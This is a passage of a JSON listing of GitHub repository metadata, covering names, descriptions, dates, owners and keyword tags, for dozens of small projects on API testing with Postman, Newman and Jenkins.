postman"]},{"id":207528819,"name":"APIDataDriverTestingWithPostman","full_name":"raghwendra-sonu/APIDataDriverTestingWithPostman","description":"https://medium.com/@Raghwendra.sonu/data-driven-testing-with-postman-using-csv-and-json-files-c4f112015eb3?source=friends_link&sk=d0e70700ef7d717ecb4c86dded9552ef","fork":false,"created_at":"2019-09-10T10:21:39Z","updated_at":"2019-11-14T03:48:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7844894,"owner_login":"raghwendra-sonu","owner_avatar_url":"https://avatars1.githubusercontent.com/u/7844894?v=4","pulled":1,"tags":["test","data","testing","file","json","http","files","https","source","link","drive","driven","friend"]},{"id":228353837,"name":"postmanrepo","full_name":"Prafulkumarbheemanathi/postmanrepo","description":"creating for testing web services with API","fork":false,"created_at":"2019-12-16T09:48:25Z","updated_at":"2019-12-16T11:00:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57483099,"owner_login":"Prafulkumarbheemanathi","owner_avatar_url":"https://avatars3.githubusercontent.com/u/57483099?v=4","pulled":1,"tags":["test","testing","service","services","creating"]},{"id":117567227,"name":"postman-api-test","full_name":"sportngin/postman-api-test","description":"Postman API tests for middleware","fork":false,"created_at":"2018-01-15T16:13:45Z","updated_at":"2018-01-18T21:10:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3728684,"owner_login":"sportngin","owner_avatar_url":"https://avatars3.githubusercontent.com/u/3728684?v=4","pulled":1,"tags":["test","tests","tests ","middleware"]},{"id":83566258,"name":"PostmanRESTService","full_name":"jameswentworth/PostmanRESTService","description":"Structuring tests for API Web REST Service testing and automation using Java, JS etc.","fork":false,"created_at":"2017-03-01T14:54:18Z","updated_at":"2017-03-01T14:54:18Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":26117494,"owner_login":"jameswentworth","owner_avatar_url":"https://avatars3.githubusercontent.com/u/26117494?v=4","pulled":1,"tags":["test","testing","tests","tests ","auto","automat","automation"]},{"id":149172245,"name":"POSTMAN-SCRIPTS","full_name":"sindhureddy2903/POSTMAN-SCRIPTS","description":"API testing on real-time books api of trello.com","fork":false,"created_at":"2018-09-17T18:47:23Z","updated_at":"2018-09-17T19:21:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25784327,"owner_login":"sindhureddy2903","owner_avatar_url":"https://avatars0.githubusercontent.com/u/25784327?v=4","pulled":1,"tags":["test","testing","book","books","trello"]},{"id":188382675,"name":"postman-test","full_name":"Jenlayokale2018/postman-test","description":"test azure face api","fork":false,"created_at":"2019-05-24T08:21:56Z","updated_at":"2019-05-24T08:27:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":49546495,"owner_login":"Jenlayokale2018","owner_avatar_url":"https://avatars2.githubusercontent.com/u/49546495?v=4","pulled":1,"tags":["test","face","azure"]},{"id":167958540,"name":"postman_api_test_example","full_name":"saif-beast/postman_api_test_example","description":"Collection of code reference for testing api in postman","fork":false,"created_at":"2019-01-28T12:27:02Z","updated_at":"2019-01-28T12:27:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41823093,"owner_login":"saif-beast","owner_avatar_url":"https://avatars2.githubusercontent.com/u/41823093?v=4","pulled":1,"tags":["test"," postman","testing","code","reference"]},{"id":173055599,"name":"API_Postman-Newman","full_name":"VanessaXuLi/API_Postman-Newman","description":null,"fork":false,"created_at":"2019-02-28T06:34:46Z","updated_at":"2019-02-28T06:45:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":48055166,"owner_login":"VanessaXuLi","owner_avatar_url":"https://avatars0.githubusercontent.com/u/48055166?v=4","pulled":1,"tags":[]},{"id":199531405,"name":"testing_api_with_postman","full_name":"testingrange/testing_api_with_postman","description":"Group of tests of different apis with postman","fork":false,"created_at":"2019-07-29T21:53:34Z","updated_at":"2019-07-29T21:53:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42974248,"owner_login":"testingrange","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42974248?v=4","pulled":1,"tags":["test"," postman","tests","tests ","rent"]},{"id":194176743,"name":"postman_api_test_practice","full_name":"DomagojTadin/postman_api_test_practice","description":null,"fork":false,"created_at":"2019-06-27T23:41:34Z","updated_at":"2019-06-27T23:44:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1573479,"owner_login":"DomagojTadin","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1573479?v=4","pulled":1,"tags":[]},{"id":75584611,"name":"gettyimages-api-postman","full_name":"digideskio/gettyimages-api-postman","description":null,"fork":false,"created_at":"2016-12-05T03:20:51Z","updated_at":"2017-05-15T18:05:53Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14135456,"owner_login":"digideskio","owner_avatar_url":"https://avatars2.githubusercontent.com/u/14135456?v=4","pulled":1,"tags":[]},{"id":210043018,"name":"api-palestra-postman","full_name":"michelpl/api-palestra-postman","description":null,"fork":false,"created_at":"2019-09-21T19:35:20Z","updated_at":"2019-09-21T19:43:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6605776,"owner_login":"michelpl","owner_avatar_url":"https://avatars1.githubusercontent.com/u/6605776?v=4","pulled":1,"tags":[]},{"id":34228257,"name":"api-postman-tests","full_name":"mosaiqo/api-postman-tests","description":"Postman configurations to test the Mosaiqo API","fork":false,"created_at":"2015-04-19T23:23:39Z","updated_at":"2015-04-19T23:23:39Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1862688,"owner_login":"mosaiqo","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1862688?v=4","pulled":1,"tags":["test","config","configuration","configurations"]},{"id":78417377,"name":"API_Automation_POC_Postman","full_name":"sachinfunde/API_Automation_POC_Postman","description":null,"fork":false,"created_at":"2017-01-09T10:12:01Z","updated_at":"2017-01-10T08:33:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24644774,"owner_login":"sachinfunde","owner_avatar_url":"https://avatars2.githubusercontent.com/u/24644774?v=4","pulled":1,"tags":[]},{"id":107830286,"name":"postman_api_2_python","full_name":"luyh/postman_api_2_python","description":"API test with postman and python","fork":false,"created_at":"2017-10-22T02:06:29Z","updated_at":"2017-10-22T02:31:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10111018,"owner_login":"luyh","owner_avatar_url":"https://avatars0.githubusercontent.com/u/10111018?v=4","pulled":1,"tags":["test"," postman","python"]},{"id":157771686,"name":"LearningPostmanApiTest","full_name":"CaiqueCoelho/LearningPostmanApiTest","description":"Learning Postman Api tests with Jenkins and Newman for automation tests","fork":false,"created_at":"2018-11-15T20:57:01Z","updated_at":"2018-11-15T20:58:56Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":29831309,"owner_login":"CaiqueCoelho","owner_avatar_url":"https://avatars1.githubusercontent.com/u/29831309?v=4","pulled":1,"tags":["test","tests","tests ","auto","automat","automation"]},{"id":165408589,"name":"postman-javascript-api-tesing","full_name":"ankurjain00/postman-javascript-api-tesing","description":"This is a sample implementation of API tests in Postman with JavaScript with execution in Newman","fork":false,"created_at":"2019-01-12T16:19:10Z","updated_at":"2019-02-16T04:32:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22362698,"owner_login":"ankurjain00","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22362698?v=4","pulled":1,"tags":["test","tests","tests ","implement","sample","implementation","execution"]},{"id":169497652,"name":"API-Test-Code-Postman-","full_name":"ravalikandari/API-Test-Code-Postman-","description":"Implementation of API Testing using PostMan. In this I had tested an website named (Swagger Petstore).","fork":false,"created_at":"2019-02-07T00:21:33Z","updated_at":"2019-04-05T01:43:16Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45989945,"owner_login":"ravalikandari","owner_avatar_url":"https://avatars1.githubusercontent.com/u/45989945?v=4","pulled":1,"tags":["test","tested","site","website","store","name","named"]},{"id":187274545,"name":"Postman-API-WorkSpace","full_name":"JigarSony/Postman-API-WorkSpace","description":null,"fork":false,"created_at":"2019-05-17T19:59:39Z","updated_at":"2019-05-19T05:51:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29300019,"owner_login":"JigarSony","owner_avatar_url":"https://avatars1.githubusercontent.com/u/29300019?v=4","pulled":1,"tags":[]},{"id":168168090,"name":"postman-api-012919","full_name":"yisroel96/postman-api-012919","description":null,"fork":false,"created_at":"2019-01-29T14:26:57Z","updated_at":"2019-01-29T14:26:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43652427,"owner_login":"yisroel96","owner_avatar_url":"https://avatars3.githubusercontent.com/u/43652427?v=4","pulled":1,"tags":[]},{"id":213664472,"name":"Postman-API-issue","full_name":"Areid0093/Postman-API-issue","description":null,"fork":false,"created_at":"2019-10-08T14:23:58Z","updated_at":"2019-10-08T14:23:59Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":54606271,"owner_login":"Areid0093","owner_avatar_url":"https://avatars3.githubusercontent.com/u/54606271?v=4","pulled":1,"tags":[]},{"id":149461323,"name":"public-api-postman-collection","full_name":"serhii-sanduliak/public-api-postman-collection","description":"A collection of example requests to demonstrate and test the TransferWise public API","fork":false,"created_at":"2018-09-19T14:12:33Z","updated_at":"2018-09-21T10:34:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40859346,"owner_login":"serhii-sanduliak","owner_avatar_url":"https://avatars0.githubusercontent.com/u/40859346?v=4","pulled":1,"tags":["test","collect","collection","request","requests","example","demo","public","demonstrate"]},{"id":184620739,"name":"POSTMAN-TEST-API","full_name":"lineageispig/POSTMAN-TEST-API","description":null,"fork":false,"created_at":"2019-05-02T17:11:38Z","updated_at":"2019-05-02T17:20:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22027966,"owner_login":"lineageispig","owner_avatar_url":"https://avatars3.githubusercontent.com/u/22027966?v=4","pulled":1,"tags":[]},{"id":232864997,"name":"ea-api-rest-postman","full_name":"e-attestations/ea-api-rest-postman","description":"Postman collections for e-Attestations API REST","fork":false,"created_at":"2020-01-09T17:24:23Z","updated_at":"2020-01-09T17:34:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":58803944,"owner_login":"e-attestations","owner_avatar_url":"https://avatars3.githubusercontent.com/u/58803944?v=4","pulled":1,"tags":["test","collect","collection","collections","stat"]},{"id":205871299,"name":"postman-collection","full_name":"marishkavasiuk/postman-collection","description":"REST API testing with postman","fork":false,"created_at":"2019-09-02T14:12:00Z","updated_at":"2019-09-02T14:26:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22868519,"owner_login":"marishkavasiuk","owner_avatar_url":"https://avatars2.githubusercontent.com/u/22868519?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":144189142,"name":"postman_apis_test01","full_name":"rjupall/postman_apis_test01","description":"API tests for Checkout-All","fork":false,"created_at":"2018-08-09T18:24:39Z","updated_at":"2018-12-20T16:13:21Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42249272,"owner_login":"rjupall","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42249272?v=4","pulled":1,"tags":["test","tests","tests "]},{"id":191360055,"name":"sample-api-postman","full_name":"Tester-API/sample-api-postman","description":null,"fork":false,"created_at":"2019-06-11T11:42:28Z","updated_at":"2019-06-11T11:42:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":51704610,"owner_login":"Tester-API","owner_avatar_url":"https://avatars0.githubusercontent.com/u/51704610?v=4","pulled":1,"tags":[]},{"id":170354320,"name":"APIGEE-Postman-Integration","full_name":"Abhishek320120/APIGEE-Postman-Integration","description":null,"fork":false,"created_at":"2019-02-12T16:45:48Z","updated_at":"2019-02-12T16:45:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44698357,"owner_login":"Abhishek320120","owner_avatar_url":"https://avatars2.githubusercontent.com/u/44698357?v=4","pulled":1,"tags":[]},{"id":195505933,"name":"api_test_with_postman","full_name":"agilias/api_test_with_postman","description":null,"fork":false,"created_at":"2019-07-06T06:28:29Z","updated_at":"2019-07-06T06:57:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30356541,"owner_login":"agilias","owner_avatar_url":"https://avatars2.githubusercontent.com/u/30356541?v=4","pulled":1,"tags":[]},{"id":79540667,"name":"Postman-Demo-API-Tests","full_name":"TsvetomirSlavov/Postman-Demo-API-Tests","description":"moi demota ot edin rusnak mnogo dobro istinsko za istinski application da vidq kakvi testove se pishat i syshtite shte sa i na SoapUI","fork":false,"created_at":"2017-01-20T08:26:40Z","updated_at":"2017-01-20T08:28:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21067580,"owner_login":"TsvetomirSlavov","owner_avatar_url":"https://avatars2.githubusercontent.com/u/21067580?v=4","pulled":1,"tags":["test","application","demo","demota"]},{"id":88429140,"name":"Postman_API_Test","full_name":"vidhyarini/Postman_API_Test","description":null,"fork":false,"created_at":"2017-04-16T16:54:36Z","updated_at":"2017-04-16T16:54:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25911895,"owner_login":"vidhyarini","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25911895?v=4","pulled":1,"tags":[]},{"id":245522953,"name":"API-Auto-Test-Postman","full_name":"anirudh710-AB/API-Auto-Test-Postman","description":"Project on how to create an Automated API test framework with Postman , Jenkins/Docker","fork":false,"created_at":"2020-03-06T21:50:54Z","updated_at":"2020-03-06T21:54:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57012690,"owner_login":"anirudh710-AB","owner_avatar_url":"https://avatars3.githubusercontent.com/u/57012690?v=4","pulled":1,"tags":["test","create","framework"]},{"id":133553689,"name":"Postman_API_test","full_name":"Helenabortsova1983/Postman_API_test","description":null,"fork":false,"created_at":"2018-05-15T17:57:32Z","updated_at":"2018-05-15T17:57:32Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39312496,"owner_login":"Helenabortsova1983","owner_avatar_url":"https://avatars3.githubusercontent.com/u/39312496?v=4","pulled":1,"tags":[]},{"id":164690671,"name":"Postman_For-API-Testing","full_name":"escalibor/Postman_For-API-Testing","description":null,"fork":false,"created_at":"2019-01-08T16:34:40Z","updated_at":"2019-01-08T16:34:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19991673,"owner_login":"escalibor","owner_avatar_url":"https://avatars3.githubusercontent.com/u/19991673?v=4","pulled":1,"tags":[]},{"id":222166457,"name":"api_newman_postman_jenkins","full_name":"aydorovs/api_newman_postman_jenkins","description":"Newman, Jenkins, Postman for api tests","fork":false,"created_at":"2019-11-16T22:20:57Z","updated_at":"2019-11-16T22:21:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":47498749,"owner_login":"aydorovs","owner_avatar_url":"https://avatars1.githubusercontent.com/u/47498749?v=4","pulled":1,"tags":["test","tests"]},{"id":233606025,"name":"Postman_API_Test","full_name":"crystal178/Postman_API_Test","description":"This is for APP API testing","fork":false,"created_at":"2020-01-13T13:48:54Z","updated_at":"2020-01-15T07:36:50Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36843796,"owner_login":"crystal178","owner_avatar_url":"https://avatars2.githubusercontent.com/u/36843796?v=4","pulled":1,"tags":["test","testing"]},{"id":214487587,"name":"FoodBankApiPostman","full_name":"ThomasW0221/FoodBankApiPostman","description":null,"fork":false,"created_at":"2019-10-11T16:54:52Z","updated_at":"2019-10-12T01:32:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40696002,"owner_login":"ThomasW0221","owner_avatar_url":"https://avatars0.githubusercontent.com/u/40696002?v=4","pulled":1,"tags":[]},{"id":211289220,"name":"api-tests-postman-mockserver","full_name":"NageshJoy007/api-tests-postman-mockserver","description":"Write your api tests in a smart way using postman mock server.","fork":false,"created_at":"2019-09-27T09:55:53Z","updated_at":"2019-09-27T10:38:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16208506,"owner_login":"NageshJoy007","owner_avatar_url":"https://avatars3.githubusercontent.com/u/16208506?v=4","pulled":1,"tags":["test"," postman","tests","server","tests ","mock","smart"]},{"id":207676318,"name":"RestAPITestingPostmanJenkins","full_name":"qdoan1651/RestAPITestingPostmanJenkins","description":null,"fork":false,"created_at":"2019-09-10T22:45:51Z","updated_at":"2020-03-16T18:09:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17006414,"owner_login":"qdoan1651","owner_avatar_url":"https://avatars1.githubusercontent.com/u/17006414?v=4","pulled":1,"tags":[]},{"id":246822435,"name":"CapturePostmanApi","full_name":"SereetsiKC/CapturePostmanApi","description":null,"fork":false,"created_at":"2020-03-12T11:57:14Z","updated_at":"2020-03-12T11:57:27Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15948852,"owner_login":"SereetsiKC","owner_avatar_url":"https://avatars2.githubusercontent.com/u/15948852?v=4","pulled":1,"tags":[]},{"id":140499117,"name":"api-testing-postman-bdd","full_name":"gouthamik1/api-testing-postman-bdd","description":"API testing using postman in BDD style","fork":false,"created_at":"2018-07-10T23:53:21Z","updated_at":"2018-07-10T23:57:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39345113,"owner_login":"gouthamik1","owner_avatar_url":"https://avatars3.githubusercontent.com/u/39345113?v=4","pulled":1,"tags":["test"," postman","testing","style"]},{"id":196607386,"name":"REST_API_Testing_POSTMAN","full_name":"qaespence/REST_API_Testing_POSTMAN","description":"REST API testing using Postman for the site https://gorest.co.in","fork":false,"created_at":"2019-07-12T15:58:08Z","updated_at":"2019-08-10T03:28:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43244945,"owner_login":"qaespence","owner_avatar_url":"https://avatars0.githubusercontent.com/u/43244945?v=4","pulled":1,"tags":["test","testing","rest","http","https","site"]},{"id":189385758,"name":"tadayApiPostman","full_name":"qaitive/tadayApiPostman","description":null,"fork":false,"created_at":"2019-05-30T09:32:24Z","updated_at":"2019-05-30T09:41:43Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37244429,"owner_login":"qaitive","owner_avatar_url":"https://avatars1.githubusercontent.com/u/37244429?v=4","pulled":1,"tags":[]},{"id":211065956,"name":"api-testing-postman","full_name":"umangbudhwar/api-testing-postman","description":"Demo project for automating API testing.","fork":false,"created_at":"2019-09-26T10:46:33Z","updated_at":"2019-09-26T11:29:58Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14281150,"owner_login":"umangbudhwar","owner_avatar_url":"https://avatars1.githubusercontent.com/u/14281150?v=4","pulled":1,"tags":["test","testing","auto","automat","automating"]},{"id":216082426,"name":"postman_api_v1","full_name":"twilliamscsd/postman_api_v1","description":null,"fork":false,"created_at":"2019-10-18T18:13:18Z","updated_at":"2019-11-13T19:19:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39810350,"owner_login":"twilliamscsd","owner_avatar_url":"https://avatars0.githubusercontent.com/u/39810350?v=4","pulled":1,"tags":[]},{"id":239275721,"name":"api-testing-with-postman","full_name":"defiant-dj04/api-testing-with-postman","description":null,"fork":false,"created_at":"2020-02-09T09:11:41Z","updated_at":"2020-02-16T18:13:13Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33468586,"owner_login":"defiant-dj04","owner_avatar_url":"https://avatars2.githubusercontent.com/u/33468586?v=4","pulled":1,"tags":[]},{"id":133872474,"name":"postman_backup_api_test","full_name":"ivanryuu/postman_backup_api_test","description":null,"fork":false,"created_at":"2018-05-17T21:57:04Z","updated_at":"2020-03-29T12:01:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3419886,"owner_login":"ivanryuu","owner_avatar_url":"https://avatars2.githubusercontent.com/u/3419886?v=4","pulled":1,"tags":[]},{"id":98208954,"name":"api-postman-test","full_name":"Isaiah-LeBlanc/api-postman-test","description":null,"fork":false,"created_at":"2017-07-24T16:00:49Z","updated_at":"2017-07-24T16:00:49Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30326253,"owner_login":"Isaiah-LeBlanc","owner_avatar_url":"https://avatars0.githubusercontent.com/u/30326253?v=4","pulled":1,"tags":[]},{"id":133749445,"name":"Postman-Testing-Rest-API","full_name":"gross-micah/Postman-Testing-Rest-API","description":"Example of Postman test suite validating an API","fork":false,"created_at":"2018-05-17T02:45:43Z","updated_at":"2018-05-17T02:57:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17605163,"owner_login":"gross-micah","owner_avatar_url":"https://avatars2.githubusercontent.com/u/17605163?v=4","pulled":1,"tags":["test","suite","test suite","validating"]},{"id":123174005,"name":"go-postman-api-client","full_name":"paul-nelson-baker/go-postman-api-client","description":null,"fork":false,"created_at":"2018-02-27T18:57:44Z","updated_at":"2018-02-27T18:58:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1402178,"owner_login":"paul-nelson-baker","owner_avatar_url":"https://avatars1.githubusercontent.com/u/1402178?v=4","pulled":1,"tags":[]},{"id":126833725,"name":"postman-api-test-demo","full_name":"mindktrl/postman-api-test-demo","description":null,"fork":false,"created_at":"2018-03-26T13:33:21Z","updated_at":"2018-04-22T13:45:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18118672,"owner_login":"mindktrl","owner_avatar_url":"https://avatars0.githubusercontent.com/u/18118672?v=4","pulled":1,"tags":[]},{"id":172527463,"name":"postman-api-systest","full_name":"jimareed/postman-api-systest","description":"Using postman and newman to create automated API system tests.","fork":false,"created_at":"2019-02-25T15:03:22Z","updated_at":"2019-02-26T12:40:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10427510,"owner_login":"jimareed","owner_avatar_url":"https://avatars0.githubusercontent.com/u/10427510?v=4","pulled":1,"tags":["test"," postman","create","tests","auto","automat","newman","system","automate","automated"]},{"id":166173907,"name":"newman-postman-api-jenkins","full_name":"aldringithub/newman-postman-api-jenkins","description":null,"fork":false,"created_at":"2019-01-17T06:39:02Z","updated_at":"2019-01-17T06:39:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46629417,"owner_login":"aldringithub","owner_avatar_url":"https://avatars0.githubusercontent.com/u/46629417?v=4","pulled":1,"tags":[]},{"id":225457110,"name":"JavaApiAndPostman","full_name":"leonardonasser/JavaApiAndPostman","description":null,"fork":false,"created_at":"2019-12-02T19:56:08Z","updated_at":"2019-12-03T14:45:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57502285,"owner_login":"leonardonasser","owner_avatar_url":"https://avatars2.githubusercontent.com/u/57502285?v=4","pulled":1,"tags":[]},{"id":247460142,"name":"POSTMAN-API-TESTING","full_name":"manzooralam/POSTMAN-API-TESTING","description":null,"fork":false,"created_at":"2020-03-15T12:15:51Z","updated_at":"2020-03-15T15:08:15Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":40365917,"owner_login":"manzooralam","owner_avatar_url":"https://avatars0.githubusercontent.com/u/40365917?v=4","pulled":1,"tags":[]},{"id":219247792,"name":"Postman-Collections-Vehicles-Api","full_name":"lsolier/Postman-Collections-Vehicles-Api","description":"Postman Collections to test Vehicles API and external services that its use","fork":false,"created_at":"2019-11-03T03:48:43Z","updated_at":"2019-11-03T03:50:10Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":11725705,"owner_login":"lsolier","owner_avatar_url":"https://avatars2.githubusercontent.com/u/11725705?v=4","pulled":1,"tags":["test","service","services","external"]},{"id":219084911,"name":"api-testing-postman","full_name":"brunopulis/api-testing-postman","description":null,"fork":false,"created_at":"2019-11-02T00:56:37Z","updated_at":"2019-11-02T00:59:06Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1204692,"owner_login":"brunopulis","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1204692?v=4","pulled":1,"tags":[]},{"id":250336457,"name":"postman_api_collection_tesing","full_name":"mokuq/postman_api_collection_tesing","description":null,"fork":false,"created_at":"2020-03-26T18:14:02Z","updated_at":"2020-03-26T22:20:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25499582,"owner_login":"mokuq","owner_avatar_url":"https://avatars1.githubusercontent.com/u/25499582?v=4","pulled":1,"tags":[]},{"id":226883581,"name":"Trello_Postman_Api_Tests","full_name":"SvitlanaKarapugina/Trello_Postman_Api_Tests","description":"Postman api tests for Trello. Create/Update/Delete Board, List; Search board and search on board; Upload user image (negative and positive TC), get board's members and add board stars. I used GET, POST, PUT and DELETE. Create Environment with needed values.","fork":false,"created_at":"2019-12-09T13:54:48Z","updated_at":"2020-03-26T14:30:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19514624,"owner_login":"SvitlanaKarapugina","owner_avatar_url":"https://avatars2.githubusercontent.com/u/19514624?v=4","pulled":1,"tags":["test","tests","tests ","user","load","star","image","need","search","ember"]},{"id":161398695,"name":"postal-service","full_name":"DavyJ0nes/postal-service","description":"Simple postman testing against API","fork":false,"created_at":"2018-12-11T21:54:58Z","updated_at":"2018-12-12T09:12:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7294200,"owner_login":"DavyJ0nes","owner_avatar_url":"https://avatars1.githubusercontent.com/u/7294200?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":200482752,"name":"otus_javaqa_13","full_name":"egorsego/otus_javaqa_13","description":"Github API test with Postman","fork":false,"created_at":"2019-08-04T11:10:48Z","updated_at":"2019-08-04T11:12:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12350882,"owner_login":"egorsego","owner_avatar_url":"https://avatars0.githubusercontent.com/u/12350882?v=4","pulled":1,"tags":["test"]},{"id":101140087,"name":"postman-newman-api","full_name":"micocomartin/postman-newman-api","description":null,"fork":false,"created_at":"2017-08-23T05:10:13Z","updated_at":"2017-08-23T05:10:13Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29418206,"owner_login":"micocomartin","owner_avatar_url":"https://avatars3.githubusercontent.com/u/29418206?v=4","pulled":1,"tags":[]},{"id":116941695,"name":"API-Testing-with-Postman","full_name":"saheel05/API-Testing-with-Postman","description":null,"fork":false,"created_at":"2018-01-10T10:18:57Z","updated_at":"2018-01-10T10:18:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33613651,"owner_login":"saheel05","owner_avatar_url":"https://avatars3.githubusercontent.com/u/33613651?v=4","pulled":1,"tags":[]},{"id":248580278,"name":"Postman_Automation_Api_collection","full_name":"kerkeniakov/Postman_Automation_Api_collection","description":"This is a collection of postman automated api tests for a polling app ","fork":false,"created_at":"2020-03-19T18:48:16Z","updated_at":"2020-03-19T18:58:16Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28395932,"owner_login":"kerkeniakov","owner_avatar_url":"https://avatars3.githubusercontent.com/u/28395932?v=4","pulled":1,"tags":["test"," postman","collect","collection","tests","tests ","auto","automat","automate","automated","polling"]},{"id":88131332,"name":"oculo-api-postman","full_name":"CERATechnologies/oculo-api-postman","description":null,"fork":false,"created_at":"2017-04-13T06:14:41Z","updated_at":"2017-04-13T06:14:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12026055,"owner_login":"CERATechnologies","owner_avatar_url":"https://avatars0.githubusercontent.com/u/12026055?v=4","pulled":1,"tags":[]},{"id":196969465,"name":"Test-2","full_name":"konradporeba/Test-2","description":"test github api with postman","fork":false,"created_at":"2019-07-15T09:38:18Z","updated_at":"2019-07-15T09:38:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":34138284,"owner_login":"konradporeba","owner_avatar_url":"https://avatars0.githubusercontent.com/u/34138284?v=4","pulled":1,"tags":["test"," postman","github"]},{"id":225734088,"name":"api-docker","full_name":"chinu4104/api-docker","description":"Postman-API test automation using 